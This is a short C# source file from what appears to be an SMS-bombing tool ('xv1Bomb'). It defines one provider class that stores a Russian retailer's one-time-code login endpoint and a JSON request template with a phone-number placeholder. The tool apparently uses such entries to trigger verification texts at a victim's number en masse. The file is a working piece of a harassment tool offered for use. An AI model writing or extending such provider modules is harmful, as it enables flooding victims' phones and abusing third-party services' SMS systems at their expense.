using System.Net.Http;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;

namespace xv1Bomb.providers
{
    public class posudaProvider : smsProvider
    {
        public string link { get; set; } = @"https://posudamart.ru/account/onetimecode";
        public string json { get; set; } = @"{ ""ref"": ""/account/login"", ""phone"": ""+7@"", ""form_tab"":""sms-tab"" }";
    }
}